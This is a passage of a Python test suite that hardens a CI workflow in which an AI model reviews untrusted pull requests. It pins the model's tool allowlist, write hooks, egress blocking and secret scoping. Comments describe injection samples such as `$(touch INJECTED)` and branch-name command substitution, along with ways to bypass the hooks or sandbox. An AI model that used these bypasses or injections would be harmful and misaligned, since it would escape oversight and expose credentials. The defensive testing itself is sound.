        if nxt.strip() and len(nxt) - len(nxt.lstrip()) <= indent:
            break
        out.append(nxt)
    assert out, "the step's `with:` mapping is empty"
    return out


def indented_blocks(text: str, key: str) -> list[list[str]]:
    """EVERY `key:` mapping in `text`, as lists of its more-indented lines.

    `indented_block` returns only the FIRST, which is wrong for a scan that
    has to see them all — a second `env:` mapping further down the job would
    simply not be looked at.
    """
    lines = text.splitlines()
    out: list[list[str]] = []
    for i, ln in enumerate(lines):
        m = _key_re(key).match(ln)
        if not m or uncommented(m.group(1)):
            continue  # not this key, or it has an inline value
        indent = len(ln) - len(ln.lstrip())
        block: list[str] = []
        for nxt in lines[i + 1 :]:
            if not nxt.strip() or nxt.lstrip().startswith("#"):
                continue
            if len(nxt) - len(nxt.lstrip()) <= indent:
                break
            block.append(nxt)
        out.append(block)
    return out


def indented_block(text: str, key: str) -> list[str]:
    """Values of a block scalar or list introduced by `key:`, as raw lines.

    THE OUTERMOST `key:`, matched as a KEY. `startswith(key)` accepted any line
    beginning with those characters wherever it sat — including a line inside
    another key's block scalar, which is how an `env:` literal containing a
    decoy `permissions:` mapping could stand in for the job's real one while the
    real one was widened. A block scalar's body is necessarily more indented
    than the key introducing it, so taking the shallowest match is what makes
    the real key win; a second key at that same column is a genuine duplicate
    and asserts.

    A COMMENT DOES NOT END THE BLOCK, whatever column it sits in — the same
    correction `with_block` already carries. Ending on one dropped every entry
    written after an ordinary explanatory comment. Comments INSIDE the block are
    still returned, because a caller checks for them.
    """
    lines = text.splitlines()
    if key.startswith("- "):
        # A STEP MARKER (`- name: Run the pr_review suite`), not a mapping key.
        # Matched WHOLE rather than as a prefix, so `- name: Run the pr_review
        # suite (disabled)` is a different step to this reader as it is to
        # Actions.
        marker = key.rstrip(":")

        def introduces(ln: str) -> bool:
            return uncommented(ln.strip()) == marker

    else:
        name = key.rstrip(":")

        def introduces(ln: str) -> bool:
            m = _key_re(name).match(ln)
            if not m:
                return False
            v = uncommented(m.group(1))
            # `run: |` and `group: >-` introduce a block as a bare `key:` does.
            return not v or bool(BLOCK_HEADER.fullmatch(v))

    hits = [i for i, ln in enumerate(lines) if introduces(ln)]
    assert hits, f"{key!r} not found"
    shallowest = min(len(lines[i]) - len(lines[i].lstrip()) for i in hits)
    at_top = [i for i in hits if len(lines[i]) - len(lines[i].lstrip()) == shallowest]
    assert len(at_top) == 1, f"{key!r} is declared {len(at_top)} times at one level"
    i = at_top[0]
    out = []
    for nxt in lines[i + 1 :]:
        if not nxt.strip():
            continue
        outdented = len(nxt) - len(nxt.lstrip()) <= shallowest
        if nxt.lstrip().startswith("#"):
            if not outdented:
                out.append(nxt)
            continue
        if outdented:
            break
        out.append(nxt)
    return out


def refuse_unmodelled_spellings(case: unittest.TestCase, text: str, what: str) -> None:
    """Require `text` to be written in the narrow YAML subset these readers parse.

    Extracted from Stage 1's grammar test so Stage 2 and the suite CI get the
    same fence. Round 8 closed four separate defects that were all one shape —
    a flow mapping or a bare list marker in a file with no grammar — while
    Stage 1, which has had this since round 5, produced none of them. A grammar
    on one of three files is not a grammar.
    """
    lines = text.split("\n")
    i = 0
    while i < len(lines):
        raw = lines[i]
        i += 1
        if not raw.strip():
            continue
        # Step over block-scalar bodies wholesale: that is shell, not YAML.
        m = _ANY_BLOCK_KEY.match(raw)
        if m and BLOCK_HEADER.fullmatch(uncommented(m.group(2)) or "x"):
            indent = len(raw) - len(raw.lstrip())
            while i < len(lines) and (
                not lines[i].strip() or len(lines[i]) - len(lines[i].lstrip()) > indent
            ):
                i += 1
            continue
        body = raw.rstrip()
        case.assertNotIn(
            "\t",
            body,
            f"a tab in {what} ({body!r}); every reader here measures "
            "indentation in spaces.",
        )
        # YAML NODE PROPERTIES on a key's value. `env: &capture_env` is an
        # anchor on an otherwise-empty mapping: YAML reads the indented
        # lines under it as that mapping's entries, while every reader
        # here sees a key WITH an inline value and steps over the block —
        # so `BASH_ENV: '$(touch INJECTED)'` beneath it was scanned by
        # nothing. `*alias` and `!!tag` hide content the same way.
        inline = body.split(":", 1)[1].strip() if ":" in body else ""
        case.assertNotRegex(
            inline,
            r"^[&*!]",
            f"the {what} line {body!r} carries a YAML anchor, alias or "
            "tag. Every reader here is line-oriented and treats such a "
            "header as a key with a value, so it steps over the block "
            "beneath it — which is where the content would be. EVERY "
            "leading `!`, not just `!!`: `!<tag:yaml.org,2002:map>` is an "
            "explicit mapping tag and hides a block exactly as well.",
        )
        stripped = body.lstrip()
        # A list marker must INTRODUCE its first key on the same line.
        #
        # A bare `-` with the mapping beneath it is legal YAML and puts
        # the entry's keys at an indentation nothing here derives: the
        # step-key allowlist reads keys at `<= 8` spaces, so a bare marker
        # at six with its mapping at ten hides every key from it — `shell:
        # "bash -c …"` included. Rather than teach four readers to derive
        # per-entry indentation, the spelling is refused, which keeps step
        # keys at a fixed column and the `<= 8` bound correct by
        # construction.
        if re.fullmatch(r"-", stripped):
            case.fail(
                f"the {what} line {body!r} is a bare list marker. Write "
                "the entry's first key on the same line (`- name: …`): a "
                "bare marker puts the mapping at an indentation the "
                "step-key allowlist does not scan."
            )
        was_marker = bool(re.match(r"^- \S", stripped))
        if was_marker:
            stripped = re.sub(r"^-\s*", "", stripped)
            if not stripped:
                continue
        # A SEQUENCE ENTRY THAT IS A SCALAR, not a mapping — `- "scripts/
        # pr_review/**"` under a `paths:` filter. It declares no key, so there
        # is nothing here for a line reader to mis-read, and demanding the key
        # form would red the suite-CI file for being written in the ordinary
        # way. Still refused if it carries a `{` or an unquoted `:`, which are
        # the two ways a sequence entry hides a mapping from these readers.
        if was_marker and not re.match(r"^[\"']?[\w.-]+[\"']?[ \t]*:", stripped):
            bare = re.sub(r"\"[^\"]*\"|'[^']*'", "", stripped)
            case.assertNotIn(
                "{",
                bare,
                f"the {what} sequence entry {body!r} is a flow mapping; "
                "every reader here is line-oriented.",
            )
            case.assertNotIn(
                ":",
                bare,
                f"the {what} sequence entry {body!r} carries an unquoted "
                "`:`, so it is a mapping this grammar did not recognise as "
                "one. Write it as `- key: value`.",
            )
            continue
        # Keys are unquoted, have no space before the colon, and are
        # either lower-case YAML keys (`runs-on`, `timeout-minutes`) or
        # UPPER_SNAKE environment names.
        case.assertRegex(
            stripped,
            r"^(?:[a-z_][a-z0-9_-]*|[A-Z_][A-Z0-9_]*):(?: .*)?$",
            f"the {what} line {body!r} is not an unquoted, "
            "space-free-before-the-colon mapping key in the subset these "
            "readers parse. It may be perfectly good YAML — but the job "
            "enumerator, the step enumerator, the key allowlist and the "
            "env scan are all line-at-a-time and would each read it "
            "wrong. Rewrite it in the plain form, or teach every one of "
            "them and widen this grammar.",
        )
        # A flow mapping hides its keys from every line-oriented reader
        # here. Two brace users are NOT that and must not red: a `${{ }}`
        # expression, and the empty mapping `{}` — which is how
        # `permissions:` is spelled, and which declares nothing at all.
        without_exprs = re.sub(r"\$\{\{.*?\}\}", "", stripped, flags=re.S)
        case.assertNotIn(
            "{",
            re.sub(r":\s*\{\s*\}\s*$", ":", without_exprs),
            f"the {what} line {body!r} uses a flow mapping. Every "
            "reader in this class is line-oriented and a flow mapping "
            "hides its keys from all of them.",
        )


class TestPreparePermissions(unittest.TestCase):
    """`prepare` calls `gh api repos/.../pulls/N`, which needs the PR scope.

    `contents: read` does not cover the pulls endpoint, and declaring any
    permissions block defaults every unlisted scope to `none`. A public repo
    masks the miss because that endpoint serves public data unauthenticated;
    A private repo would 403 and take the whole run with it; declare it regardless.
    """

    def test_prepare_reads_prs_and_declares_the_scope(self):
        stage2 = STAGE2.read_text()
        prepare = job_block(stage2, "prepare")
        self.assertIn(
            "pulls/",
            strip_comments(prepare),
            "premise changed: prepare no longer reads the PR API",
        )
        # THE VALUE, not the text. `pull-requests: write # pull-requests: read`
        # satisfies a containment check while `prepare` holds write on every
        # pull request in the repository. Read as a mapping ENTRY, so a nested
        # block cannot supply it either.
        scopes = mapping_items(indented_block(prepare, "permissions:"))
        self.assertEqual(
            scopes.get("pull-requests"),
            "read",
            f"prepare's permissions are {scopes}; pull-requests must be read",
        )

    def test_review_job_holds_no_pr_scope(self):
        """The converse: the job that reads untrusted code must NOT gain it."""
        perms = indented_block(job_block(STAGE2.read_text(), "review"), "permissions:")
        joined = strip_comments("\n".join(perms))
        self.assertNotIn("pull-requests", joined)
        self.assertNotIn("write", joined.replace("id-token: write", ""))


class TestEgressAllowlistCoversItsOwnWrites(unittest.TestCase):
    """Every host the review job actually talks to must be allowlisted.

    The trace upload is this job's single write capability. It is best-effort
    (`|| echo ::warning::`), so a blocked endpoint costs a silent, permanent
    loss of every transcript plus a reasoning_uri pointing at nothing.
    """

    def setUp(self):
        self.text = STAGE2.read_text()
        self.review = job_block(self.text, "review")
        self.allowlist = " ".join(indented_block(self.review, "allowed-endpoints:"))

    def test_block_scalar_holds_no_comment_lines(self):
        """`>` makes indented lines content — a `#` line becomes a bogus entry."""
        for ln in indented_block(self.review, "allowed-endpoints:"):
            self.assertFalse(
                ln.lstrip().startswith("#"), f"comment inside block scalar: {ln!r}"
            )

    def test_every_s3_bucket_written_is_allowlisted(self):
        buckets = env_values(self.text, "S3_BUCKET")
        self.assertEqual(len(buckets), 1, f"S3_BUCKET is bound {len(buckets)} times")
        name = buckets[0]
        writes = re.findall(r"s3://\$\{S3_BUCKET\}/", strip_comments(self.review))
        self.assertTrue(writes, "premise changed: review job no longer writes to S3")
        self.assertIn(
            f"{name}.s3.", self.allowlist, f"{name} is written but not allowlisted"
        )

    def test_egress_policy_is_block(self):
        """THE VALUE, not the presence of the string anywhere in the job.

        `egress-policy: audit # egress-policy: block` satisfied a substring
        search while the runner audited instead of blocking. Read the key's own
        value, with its trailing comment removed.
        """
        hits = [
            uncommented(m.group(1))
            for ln in strip_comments(self.review).splitlines()
            if (m := _key_re("egress-policy").match(ln.strip()))
        ]
        self.assertEqual(
            hits,
            ["block"],
            f"harden-runner's egress-policy is {hits}, not ['block']; "
            "`audit` reports outbound connections and permits all of them.",
        )

    def test_the_egress_allowlist_has_no_wildcard(self):
        """An allowlist that admits everything reads exactly like one that does not.

        `*:443` as an entry leaves `egress-policy: block` in force and permits
        every host on 443, so the eleven specific entries become decorative and
        every other test in this class — which check that a written bucket
        APPEARS in the list — still pass. harden-runner accepts the wildcard.
        """
        entries = [
            e
            for ln in indented_block(self.review, "allowed-endpoints:")
            for e in ln.split()
        ]
        self.assertTrue(entries, "premise changed: the allowlist is empty")
        bad = [e for e in entries if "*" in e or e.startswith(":")]
        self.assertEqual(
            bad,
            [],
            f"the egress allowlist carries a wildcard ({bad}); every host it "
            "matches is reachable and the specific entries stop meaning "
            "anything.",
        )


class TestTheReviewJobsTrustedSurfaceIsPinned(unittest.TestCase):
    """Three things the review job leans on that nothing asserted.

    Each was found by cross-model review in round 8, and each is the same
    shape: a control whose ABSENCE changes nothing any other test can see.
    """

    def setUp(self):
        self.text = STAGE2.read_text()
        self.review = job_block(self.text, "review")

    # The complete tool policy, as two exact strings. "Read is path-scoped"
    # was checked by looking for the scoped rules — which stay present when a
    # BARE `Read` is appended, and a bare rule grants every path on the runner
    # including `/proc/self/environ` and the AWS session in this step's
    # environment. A list is only a policy if nothing may be added to it.
    EXPECTED_ALLOWED_TOOLS = (
        "Read(/${{ github.workspace }}/pr/**),"
        "Grep(/${{ github.workspace }}/pr/**),"
        "Glob(/${{ github.workspace }}/pr/**),"
        "Read(/${{ github.workspace }}/trusted/.claude/skills/pr-review-readiness/**),"
        "Read(//tmp/pr-diff.txt),"
        "Read(//tmp/pr-files.txt),"
        "Read(/${{ runner.temp }}/pr-review-findings.json),"
        "Write"
    )
    EXPECTED_DISALLOWED_TOOLS = "Bash,Edit,NotebookEdit,WebFetch,WebSearch,Task"

    def test_the_tool_policy_is_exactly_what_was_reviewed(self):
        for flag, expected in (
            ("--allowedTools", self.EXPECTED_ALLOWED_TOOLS),
            ("--disallowedTools", self.EXPECTED_DISALLOWED_TOOLS),
        ):
            with self.subTest(flag=flag):
                body = strip_comments(self.review)
                # EXACTLY ONE OCCURRENCE. Pinning the first match says nothing
                # about a second `--allowedTools "Read"` appended below it, and
                # which of two wins is the action's behaviour to change — so
                # the ambiguity is refused rather than reasoned about.
                self.assertEqual(
                    body.count(flag),
                    1,
                    f"{flag} appears {body.count(flag)} times; which one the "
                    "action honours is not this file's to assume.",
                )
                m = re.search(rf"{re.escape(flag)}\s+\"([^\"]*)\"", body)
                self.assertIsNotNone(m, f"the review step declares no {flag}")
                self.assertEqual(
                    m.group(1),
                    expected,
                    f"the review's {flag} changed. Every entry decides what "
                    "the model may reach on a runner holding an AWS session; "
                    "review the change, then update this constant.",
                )

    def test_harden_runner_keeps_its_two_settings_and_cannot_be_skipped(self):
        """Being FIRST is not the same as RUNNING.

        `if: false` on the step leaves it first and leaves egress unrestricted
        and sudo available; deleting `disable-sudo: true` leaves a process able
        to tear the egress monitor down. Neither moved any other assertion.
        """
        step = self._harden_runner_step()
        refuse_disabling_keys(self, step, "the harden-runner step")
        # THE KEY'S VALUE. `disable-sudo: false # disable-sudo: true` satisfied
        # a substring search while leaving passwordless sudo available.
        seen = [
            uncommented(m.group(1))
            for ln in strip_comments(step).splitlines()
            if (m := _key_re("disable-sudo").match(ln.strip()))
        ]
        self.assertEqual(
            seen,
            ["true"],
            f"harden-runner's disable-sudo is {seen}, not ['true']; a process "
            "in the review job could then remove the egress monitor.",
        )

    def _harden_runner_step(self) -> str:
        rest = self.review[self.review.index("- name: Harden runner") :]
        nxt = re.search(r"(?m)^      -(?: |$)", rest[1:])
        return rest[: nxt.start() + 1] if nxt else rest

    def test_no_secret_is_declared_where_the_review_job_inherits_it(self):
        """The review job's own text is not the whole surface it sees.

        A workflow-level `env:` reaches every job, so `GH_TOKEN: ${{
        secrets.GITHUB_TOKEN }}` at column 0 hands a token to the job that runs
        fork code while `test_review_job_uses_no_secrets`, which reads only the
        job block, stays green. Column-0 `env:` is refused outright here; the
        two jobs that legitimately need a token declare it at STEP level.
        """
        text = strip_comments(STAGE2.read_text())
        top = text.split("\njobs:", 1)[0]
        # THREE SPELLINGS OF ONE CREDENTIAL. `secrets['GITHUB_TOKEN']` is the
        # index form of `secrets.GITHUB_TOKEN`, and `github.token` is the same
        # token again under a different context — all three hand it to every
        # job, including the one that runs pull-request code.
        offenders = [
            ln.strip()
            for ln in top.splitlines()
            if re.search(r"secrets\s*[.\[]|github\s*[.\[]\s*[\"']?token", ln)
        ]
        self.assertEqual(
            offenders,
            [],
            f"Stage 2 names a secret at workflow level ({offenders}); every "
            "job inherits it, including the one that runs pull-request code.",
        )

    def test_harden_runner_is_the_first_step(self):
        """Its own comment says MUST be first; nothing enforced it.

        Moved below the two checkouts, the egress block and `disable-sudo` are
        not in force while the untrusted tree is fetched — and every other test
        in the egress class, which reads the step wherever it sits, stays
        green. Contrast the symlink scrub, whose order IS pinned.
        """
        entries = [
            e.strip()
            for e in re.split(r"(?m)^      -(?: |$)", strip_comments(self.review))[1:]
        ]
        self.assertTrue(entries, "premise changed: the review job has no steps")
        self.assertIn(
            "step-security/harden-runner@",
            entries[0],
            "harden-runner is not the review job's first step; until it runs, "
            "egress is unrestricted and sudo is available.",
        )

    def test_no_step_writes_the_environment_or_the_path_at_runtime(self):
        """The env allowlist reads `env:` mappings; a step can skip them.

        `echo "PYTHONPATH=${GITHUB_WORKSPACE}/pr" >> "$GITHUB_ENV"` sets the
        variable for every LATER step in the job without appearing in any
        `env:` mapping, so no allowlist is consulted — and that is exactly the
        hazard the allowlist's own comment names. `$GITHUB_PATH` is the same
        mechanism for the program a later step resolves. Neither file needs
        either, so both are refused outright.
        """
        text = strip_comments(STAGE2.read_text())
        offenders = [
            ln.strip()
            for ln in text.splitlines()
            if "GITHUB_ENV" in ln or "GITHUB_PATH" in ln
        ]
        self.assertEqual(
            offenders,
            [],
            f"Stage 2 writes the runtime environment ({offenders}); names set "
            "that way reach every later step without passing the `env:` "
            "allowlist.",
        )

    # The only expressions a Stage 2 `run:` body may carry. Each is generated
    # by GitHub or by this file, and none can hold a character a pull request
    # chose: `repository` is fixed, `run_id`/`run_attempt` are integers,
    # `workspace`/`runner.temp` are runner paths, and `pr_number` comes out of
    # `prepare`, which validates it against `^[0-9]+$` before exporting it.
    # Anything else — a branch name, a title, a label — must arrive via `env:`.
    SHELL_SAFE_EXPRESSIONS = frozenset(
        (
            "github.repository",
            "github.run_id",
            "github.run_attempt",
            "github.workspace",
            "runner.temp",
            "needs.prepare.outputs.pr_number",
        )
    )

    def test_no_stage2_script_interpolates_an_expression(self):
        """Stage 1 forbids this; Stage 2 had no counterpart at all.

        `echo "on ${{ github.event.workflow_run.head_branch }}"` inside a
        `publish` step is substituted by the runner before bash parses, and a
        fork branch name may contain `$( )`, a backtick or `;` — command
        execution in the job holding `issues: write`, `pull-requests: write`
        and a token. Every value Stage 2 needs already arrives through `env:`,
        which is quoting-safe; the construct is refused in `run:` bodies.
        """
        text = STAGE2.read_text()
        offenders = []
        for job in ("prepare", "review", "publish"):
            lines = job_block(text, job).splitlines()
            starts = [
                i for i, ln in enumerate(lines) if re.match(r"^      -(\s|$)", ln)
            ]
            for a, b in zip(starts, starts[1:] + [len(lines)]):
                entry = "\n".join(lines[a:b])
                for _, body in block_scalars(entry, "run"):
                    for ln in body:
                        offenders += [
                            (job, e)
                            for e in re.findall(r"\$\{\{\s*(.*?)\s*\}\}", ln)
                            if e not in self.SHELL_SAFE_EXPRESSIONS
                        ]
        self.assertEqual(
            offenders,
            [],
            f"a Stage 2 `run:` body interpolates {offenders}. The runner "
            "substitutes the text before bash parses it, so anything a pull "
            "request can influence — a branch name, a title, a label — "
            "becomes shell. Pass it through `env:` and quote the variable, "
            "or add it here once you have established it cannot.",
        )

    def test_the_model_output_is_never_echoed_to_the_log(self):
        """The file's own capitalised prohibition, with nothing enforcing it.

        `show_full_output` / `display_report` put UNSANITIZED model output —
        the thing `extract_verdict.py` exists to stand in front of — into a log
        any pull-request author can read.
        """
        for flag in ("show_full_output", "display_report"):
            self.assertNotIn(
                flag,
                strip_comments(STAGE2.read_text()),
                f"`{flag}` is set; it bypasses the sanitizer and publishes raw "
                "model output to a log.",
            )

    def test_stage2_declares_exactly_the_three_jobs_that_were_reviewed(self):
        """Stage 1 pins its job set; Stage 2 did not.

        A fourth job declaring `environment: bedrock`, assuming the publisher
        role and checking out the PR head is green today, because every
        role-separation test inspects the job literally named `review`.
        """
        after = strip_comments(STAGE2.read_text()).split("\njobs:", 1)[1]
        jobs = re.findall(rf"(?m)^  (\S.*?):{HEADER_TAIL}", after)
        self.assertEqual(
            jobs,
            ["prepare", "review", "publish"],
            f"Stage 2's jobs are {jobs}. Every role, environment and "
            "checkout assertion in this file names one of three; a fourth is "
            "covered by none of them.",
        )

    def test_the_label_move_is_gated_on_the_row_it_records(self):
        """The class named for this contradiction did not pin it.

        It asserted only that the label step READS the row's effective status;
        replacing the comparison with a constant lets a `model_error` row sit
        beside a PR marked `ready for review`, which then suppresses every
        future automatic review of it.
        """
        publish = strip_comments(job_block(STAGE2.read_text(), "publish"))
        self.assertIn(
            '[ "$STATUS" != "succeeded" ]',
            publish,
            "the label move no longer compares the recorded status against "
            "`succeeded`; a failed review could still mark the PR reviewed.",
        )

    # The review job's step set, by name and in order. Stage 1 pins jobs,
    # steps, action identities and script digests because it is the job a
    # pull request triggers; the `review` job is the one that CHECKS THE PULL
    # REQUEST OUT, and it had no set-pin at all — a step whose body is
    # `bash pr/scripts/ci-hook.sh` was green.
    EXPECTED_REVIEW_STEPS = (
        "Harden runner",
        "Trusted checkout (prompt, schema, sanitizer)",
        "Untrusted checkout at the authenticated head SHA",
        "Remove symlinks that escape the PR tree",
    )

    def test_the_review_job_opens_with_exactly_the_steps_that_were_reviewed(self):
        names = re.findall(r"(?m)^      - name: (.+)$", strip_comments(self.review))
        self.assertEqual(
            list(self.EXPECTED_REVIEW_STEPS),
            names[: len(self.EXPECTED_REVIEW_STEPS)],
            f"the review job's opening steps are {names[:6]}. This job holds "
            "the untrusted checkout and an AWS session; a step inserted "
            "before the scrub runs against a tree that still has escaping "
            "symlinks in it.",
        )
        unnamed = re.findall(
            r"(?m)^      -(?: (?!name:)| *$)", strip_comments(self.review)
        )
        self.assertEqual(
            unnamed,
            [],
            f"the review job has {len(unnamed)} step(s) with no `name:`; the "
            "enumeration above cannot see them.",
        )

    def test_the_artifact_and_the_api_are_both_corroborated(self):
        """Two comparisons hold the whole provenance story up.

        The artifact is shape-checked and the API is queried either way, so
        deleting EITHER comparison leaves every other assertion green while the
        claim "the artifact is corroborated, never believed" becomes false: a
        forged artifact could then name a different commit, or a victim PR.
        Both are pinned literally because each is one line of shell in a job
        nothing else re-checks.
        """
        prepare = strip_comments(job_block(self.text, "prepare"))
        # THE WHOLE LINE, not the comparison as a substring. Bash evaluates an
        # AND/OR list left to right, so `|| true || {` and a trailing
        # `&& false` each leave the comparison byte-identical where a
        # containment check looks for it while the rejection becomes
        # unreachable. Compared through `uncommented`, so an explanatory
        # trailing comment — which changes nothing bash does — is not a red.
        for expected, what in (
            (
                '[[ "$HEAD_SHA" == "$EVENT_HEAD_SHA" ]] || {',
                "the captured head_sha against workflow_run.head_sha",
            ),
            (
                'if [ "$API_HEAD_REPO" != "$EVENT_HEAD_REPO" ] '
                '|| [ "$API_HEAD_REF" != "$EVENT_HEAD_BRANCH" ]; then',
                "the API's head repo/branch against the event's",
            ),
        ):
            key = expected.split("]")[0]
            seen = [uncommented(ln.strip()) for ln in prepare.splitlines() if key in ln]
            self.assertEqual(
                seen,
                [expected],
                f"the comparison of {what} is {seen}, not [{expected!r}]. "
                "Anything added to that line can make the rejection "
                "unreachable while the comparison stays exactly where a "
                "substring check looks for it.",
            )
        # THAT EACH COMPARISON REJECTS IS ESTABLISHED BY RUNNING IT, in
        # TestTheProvenanceGuardsRejectWhenTheyDisagree below. Three textual
        # pins have now failed at it in turn — a substring `exit 1`, then a
        # standalone `exit 1` STATEMENT, then the same statement bounded by the
        # branch's closing `}`/`fi` rather than by a character count. All three
        # were defeated by `[[ … ]] || true || { … exit 1; }`, which keeps
        # every literal a reader looks for inside a branch bash never reaches.
        # The two assertions above stay because they name WHICH values must be
        # compared, which an executed step cannot say; what the step DOES with
        # the answer is measured, not read.

    def test_the_write_boundary_hook_is_declared(self):
        """`Write` is granted BARE, and this hook is what confines it.

        The grant is deliberately unqualified because a path-qualified Write
        rule refuses with no reason recorded anywhere a workflow can read — so
        the PreToolUse hook, not the tool list, is the boundary. Delete the
        entry and the model may write anywhere the runner can, including over
        `trusted/scripts/pr_review/extract_verdict.py`, which a later step
        executes. Nothing else in this file would notice.
        """
        # PARSED, not searched. The value is a JSON literal, so `json.loads`
        # is exact here where the line readers elsewhere in this file are not —
        # and a substring search could not tell `"PreToolUse"` from
        # `"PreToolUseDISABLED"`, which keeps every string it looks for in the
        # file while wiring the hook to an event that never fires. Measured.
        raw = textwrap.dedent("\n".join(indented_block(self.review, "settings:")))
        # AND THE TWO DECODERS MUST AGREE. Actions substitutes `${{ … }}` in
        # this blob BEFORE anything parses it as JSON, so a JSON escape defeats
        # a test that decodes first: `${{ github.workspace }}` reconstructs
        # the expected command for `json.loads` while Actions sees no expression
        # opener at all and the hook command stays a literal that resolves to
        # nothing. No escape in this blob is legitimate — every value is a path
        # or a matcher — so any backslash is refused rather than interpreted.
        self.assertNotIn(
            "\\",
            raw,
            "the review's settings carry a backslash escape. Actions expands "
            "`${{ … }}` in this text before it is JSON, so an escaped `$` is "
            "an expression to `json.loads` and a literal to the runner.",
        )
        settings = json.loads(raw)
        # THE WHOLE SETTINGS OBJECT, not just its hooks. `disableAllHooks:
        # true` beside them turns every entry below into decoration while each
        # assertion on those entries still passes.
        self.assertEqual(
            sorted(settings),
            ["hooks"],
            f"the review's settings declare {sorted(settings)}; only `hooks` "
            "is modelled here, and a sibling key can switch them all off.",
        )
        # THE WHOLE HOOKS OBJECT, as a VALUE. Every earlier version of this
        # test asked whether the expected command was PRESENT, which permits
        # one beside it: a second command on the same entry, or a second entry
        # under a matcher nobody modelled, pointing at
        # `${{ github.workspace }}/pr/…` runs pull-request code on every write
        # the model attempts — with the trusted guard still running and every
        # assertion here green. Measured. Presence cannot express "and nothing
        # else", so the comparison is an equality against the exact set.
        #
        # It subsumes what the per-event loop checked and keeps its reasons:
        # the MATCHER AND THE COMMAND must be on the SAME entry (as two
        # independent lists, `{"matcher": "Write|…", "command": "true"}` beside
        # `{"matcher": "Edit", "command": ".../restrict-write.sh"}` satisfied
        # both while the bare `Write` grant ran unhooked); the command is EXACT
        # rather than a suffix, because `: ${{ … }}/…/restrict-write.sh` runs
        # bash's no-op builtin and still ends with the same text; and each hook
        # object's KEYS are exact, because a sibling key — `"async": true`
        # being the one that matters, where the CLI supports it — leaves the
        # event, the matcher and the command untouched while the hook stops
        # being able to BLOCK the write it is the only boundary on.
        #
        # Commands go through `norm_expr` first, so respacing
        # `${{github.workspace}}` — which Actions resolves identically — is not
        # a difference. Everything else is compared verbatim.
        trusted = "${{ github.workspace }}/trusted/.claude/hooks/pr_review/"
        hooks = json.loads(norm_expr(json.dumps(settings["hooks"])))
        self.assertEqual(
            hooks,
            {
                "PreToolUse": [
                    {
                        "matcher": "Write|Edit|MultiEdit|NotebookEdit",
                        "hooks": [
                            {
                                "type": "command",
                                "command": trusted + "restrict-write.sh",
                            }
                        ],
                    }
                ],
                "PostToolUse": [
                    {
                        "matcher": "Write",
                        "hooks": [
                            {
                                "type": "command",
                                "command": trusted + "validate-post-write.sh",
                            }
                        ],
                    }
                ],
                "Stop": [
                    {
                        "hooks": [
                            {
                                "type": "command",
                                "command": trusted + "validate-on-stop.sh",
                            }
                        ]
                    }
                ],
            },
            "the review's hooks are not exactly the three trusted guards; "
            "anything extra here runs on the model's writes, and a command "
            "under `pr/` is pull-request code executing inside the trusted "
            "step.",
        )

    def test_the_prompt_hash_covers_the_trusted_surface(self):
        """A telemetry hash that omits half of what it identifies.

        `prompt_hash` is how two runs are told apart in the row table. It used
        to cover the workflow, the sanitizer, the row builder and the rubric —
        not the four hooks that bound what the model may write, nor the
        validator that decides what a finding may say. Two runs differing only
        there recorded the same hash.
        """
        step = "\n".join(indented_block(self.review_prepare(), "run:"))
        hashed = set(re.findall(r"([\w./-]+\.(?:py|sh|md|yml))", step))
        required = {
            ".github/workflows/hardened-pr-review-run.yml",
            "scripts/pr_review/extract_verdict.py",
            "scripts/pr_review/emit_row.py",
            "scripts/pr_review/validate_findings.py",
            ".claude/skills/pr-review-readiness/SKILL.md",
        } | {
            f".claude/hooks/pr_review/{n}"
            for n in (
                "restrict-write.sh",
                "validate-findings.sh",
                "validate-on-stop.sh",
                "validate-post-write.sh",
            )
        }
        # THE EXACT SET, both ways. A file MISSING means a change there moves
        # the review's behaviour without moving the hash that identifies it; an
        # EXTRA one means the hash moves for a change this contract does not
        # model, and neither is visible from a containment check.
        self.assertEqual(
            hashed,
            required,
            f"the prompt hash covers {sorted(hashed)}, not {sorted(required)}",
        )
        for path in sorted(required):
            self.assertTrue(
                (REPO / path).is_file(), f"the hash names a missing file: {path}"
            )

    def test_the_exported_hash_is_the_digest_of_every_file_it_names(self):
        """RUN the step: naming a file is not hashing it, and four text pins
        in a row failed to tell the difference.

        `cat a b >/dev/null; cat c | sha256sum` mentions three files and hashes
        one. `HASH=disabled` before the export, a second
        `echo "hash=disabled" >> "$GITHUB_OUTPUT"` after it, and an indirect
        `"${!var}"` write each leave a constant in the output while every
        occurrence a reader counts stays put. Executing the step settles all of
        them at once: the value that reaches $GITHUB_OUTPUT is compared against
        the digest this test computes itself, and each named file is perturbed
        in turn to prove its bytes actually reach that digest.
        """
        step = "\n".join(indented_block(self.review_prepare(), "run:"))
        # Order matters to the digest and is the workflow's to choose, so it is
        # read from the step rather than pinned. WHICH files are named is
        # pinned, exactly, by the test above.
        named = re.findall(r"([\w./-]+\.(?:py|sh|md|yml))", step)
        self.assertEqual(len(named), len(set(named)), f"a file is named twice: {named}")

        def run(bodies: dict) -> tuple:
            with tempfile.TemporaryDirectory() as td:
                for rel, data in bodies.items():
                    dst = Path(td) / rel
                    dst.parent.mkdir(parents=True, exist_ok=True)
                    dst.write_bytes(data)
                proc, out = run_step(
                    self.text, "Hash the trusted prompt surface", td, {}, {}
                )
                return proc, out.read_text()

        def digest(bodies: dict) -> str:
            return hashlib.sha256(b"".join(bodies[rel] for rel in named)).hexdigest()

        def check(bodies: dict, why: str) -> None:
            # SUCCESS AND THE RECOMPUTED VALUE, on every case. Asserting only
            # that a perturbed run's output DIFFERS passes when the step
            # crashes and writes nothing, which is the opposite of the property
            # — the hash would then not identify anything at all.
            proc, written = run(bodies)
            self.assertEqual(proc.returncode, 0, proc.stdout + proc.stderr)
            self.assertEqual(
                sole_outputs(self, written),
                {"hash": digest(bodies)[:16]},
                f"{why}: the step exported {written!r}, not the digest of the "
                f"files it names ({digest(bodies)[:16]}) as its one output",
            )

        bodies = {rel: f"content of {rel}\n".encode() for rel in named}
        check(bodies, "unperturbed")
        for rel in named:
            with self.subTest(perturbed=rel):
                # The digest is recomputed from the perturbed fixture, so this
                # asserts the hash MOVED TO THE RIGHT VALUE rather than merely
                # moved — and a file dropped from the `cat` leaves it unmoved
                # while the expected value changes.
                check(dict(bodies, **{rel: bodies[rel] + b"x"}), f"perturbed {rel}")

    def review_prepare(self) -> str:
        """The `Hash the trusted prompt surface` step, in `prepare`."""
        prepare = strip_comments(job_block(self.text, "prepare"))
        i = prepare.index("Hash the trusted prompt surface")
        rest = prepare[i:]
        nxt = re.search(r"(?m)^      -(?: |$)", rest)
        return rest[: nxt.start()] if nxt else rest


class TestCredentialDuration(unittest.TestCase):
    """900s is the STS minimum and the stated policy; the role ceiling is 1h.

